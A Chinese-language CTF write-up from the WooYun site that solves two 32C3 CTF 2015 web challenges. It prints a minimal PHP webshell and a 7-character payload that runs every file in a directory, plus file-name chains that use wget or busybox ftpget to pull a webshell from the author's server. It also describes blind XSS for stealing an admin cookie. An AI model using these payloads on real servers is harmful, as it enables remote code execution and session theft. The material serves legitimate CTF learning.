<main class="main-container ng-scope" ng-view=""><div class="main receptacle post-view ng-scope"><article class="entry ng-scope" ng-controller="EntryCtrl" ui-lightbox=""><header><h1 class="entry-title ng-binding">32C3 CTF 两个Web题目的Writeup</h1><div class="entry-meta"><a target="_blank" class="author name ng-binding">一个狗</a> <span class="bull">·</span> <time title="2015/12/31 11:57" ui-time="" datetime="2015/12/31 11:57" class="published ng-binding ng-isolate-scope">2015/12/31 11:57</time></div></header><section class="entry-content ng-binding" ng-bind-html="postContentTrustedHtml"><p></p><h1>0x00 简介</h1><hr><p>作为一个销售狗，还能做得动Web题，十分开心。 这次搞了两个题目，一个是TinyHosting，一个是Kummerkasten。</p><h1>0x01 TingHosting</h1><hr><blockquote><p>A new file hosting service for very small files. could you pwn it?<br>http://136.243.194.53/</p></blockquote><p>可以首先在页面中发现一个隐藏的src参数，在URL里加上?src=1之后可以返回出页面的源代码。</p><p><img alt="p1" img-src="7c22d09f36e3e6151d1f7b4c19d66e61824ec8e1.jpg"></p><p>大概的意思就是说可以往服务器上传任意文件名的文件，不过每个文件的内容只有有7个字符那么长。</p><p>于是首先google了一下，最短的php webshell应该是14字符的这个：</p><pre><code>#!php
&lt;?=`$_GET[1]`;
</code></pre><p>(PS：原文的该代码被转意过了,若有错误...见谅.</p><p>显然不够长啊。</p><p>后来脑洞了很多，想到了可爱的 <code>*</code> ，于是很重要的payload是：</p><pre><code>#!bash
z.php
</code></pre><p>内容为：</p><pre><code>#!php
&lt;?=`*`;
</code></pre><p>刚好七个字符，不多不少，能把当前目录下的所有玩意按顺序执行一遍。</p><p>于是就要构造一些执行链了，一开始的想法是：</p><pre><code>#!bash
busybox ftpget two.dog w.php z.php
</code></pre><p>其中前4个文件内容随意，w.php是上面的关键payload，执行w.php后其内容被我服务器上的webshell覆盖，而获取webshell。</p><p>结果悲剧的发现<code>busybox ftpget</code>支持的host只能是ip，而不支持域名。</p><p>后来想通过wget来构造，利用了302跳转可以跨协议的特点。</p><pre><code>#!bash
wget wtf.two.dog z.php
</code></pre><p>前两个文件人意内容，z.php为重要payload，即可拿下webshell。</p><p>但仔细一看，这题会在每一个人的目录下创建一个<code>index.html</code>，于是执行链被破环没法工作。</p><p>于是使用bash来先干掉index.html</p><p>构造：</p><pre><code>#!bash
bash bb index.html z.php
</code></pre><p>其中bash内容随意，bb的内容为<code>rm ./*</code>不超过7个字符。然后再通过上面的方法即可获得一个webshell，然后在根目录发现一个flag。</p><p><img alt="p2" img-src="604bd18efdd39e53a6438c29e895a24da86a531c.jpg"></p><p>之后看了老外的做法真是简单好用，就利用bash、bb和z.php，bb的内容分别为<code>ls /</code>,<code>cat /f*</code>,简单直接0 0</p><h1>0x02 Kummerkasten</h1><hr><blockquote><p>Our Admin is a little sad this time of the year. Maybe you can cheer him up at this site http://136.243.194.46/<br>Please note: This challenge does not follow the flag format.</p><p>Hints:<br>To build the flag, concatenate both parts and omit '32C3_'</p></blockquote><p>进去之后只有一个提交留言的地方，四下看了看没发现别的东西，感觉和XSS会有关。</p><p>直接丢了一个盲打cookie的payload之后收到了回显：</p><p><img alt="p3" img-src="da1b2704307eefd41837e5ae4dfed2f2ed8f8ffc.jpg"></p><p>访问过去是403，感觉需要用XSS来读一下页面的内容。</p><p>本来的思路是XSS里带上jQuery然后用jQuery操作，结果发现页面里面有，太方便了。</p><p>直接用ajax可以轻松读取页面并回传。</p><p>看到了 <code>/admin/bugs</code> 和 <code>/admin/token</code></p><p>根据页面中的信息来看，关键是要读两个png图片回来。</p><p>最后的payload如下：</p><p><img alt="p4" img-src="d05b040e3d005c9d16e22404269b76710a9f0f72.jpg"></p><p>然后把两个图里的内容，一个mysql的password和一个6位数字拼起来就是FLAG咯。</p><h1>0x03 Other</h1><p>更多的writeup可以参考如下链接：</p><p><a href="https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web">https://github.com/ctfs/write-ups-2015/tree/master/32c3-ctf-2015/web</a></p><p></p></section></article><div class="entry-controls clearfix"><div style="float:left;color:#9d9e9f;font-size:15px"><span>&copy;乌云知识库版权所有 未经许可 禁止转载</span></div></div><div class="yarpp-related"><h3>为您推荐了适合您的技术文章:</h3><ol id="recommandsystem"><li><a href="http://drops.wooyun.org/news/11588" rel="bookmark" id="re1">安全预警：国内超过300台juniper网络设备受后门影响</a></li><li><a href="http://drops.wooyun.org/tips/9106" rel="bookmark" id="re2">WireShark黑客发现之旅（6）—“Lpk.dll劫持+ 飞客蠕虫”病毒</a></li><li><a href="http://drops.wooyun.org/tips/3420" rel="bookmark" id="re3">Hack.lu 2014 Writeup</a></li><li><a href="http://drops.wooyun.org/papers/155" rel="bookmark" id="re4">CSRF简单介绍及利用方法</a></li></ol></div><div id="comments" class="comment-list clearfix"><div id="comment-list"><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">疯子</span> <span class="reply-time">2016-01-05 16:17:23</span></div><p></p><p>我猫大人姿势可以</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">夏殇</span> <span class="reply-time">2015-12-31 17:27:55</span></div><p></p><p>来跟猫爷爷学学姿势</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">tonywang</span> <span class="reply-time">2015-12-31 17:01:29</span></div><p></p><p>牛逼啊，不过打不开那个ip了。很好玩的样子</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">1kkonzome</span> <span class="weibo"></span> <span class="reply-time">2015-12-31 16:19:50</span></div><p></p><p>…调皮了</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">mouff</span> <span class="weibo"></span> <span class="reply-time">2015-12-31 16:08:46</span></div><p></p><p>一个狗...</p><p></p></div></div><div class="note-comment"><img class="avatar" alt="30" src="http://wooyun.b0.upaiyun.com/wooyun_job/avatar/default.png"><div class="content"><div class="comment-header"><span class="author-link">数据流</span> <span class="reply-time">2015-12-31 15:19:15</span></div><p></p><p>死猫大人</p><p></p></div></div></div></div></div></main>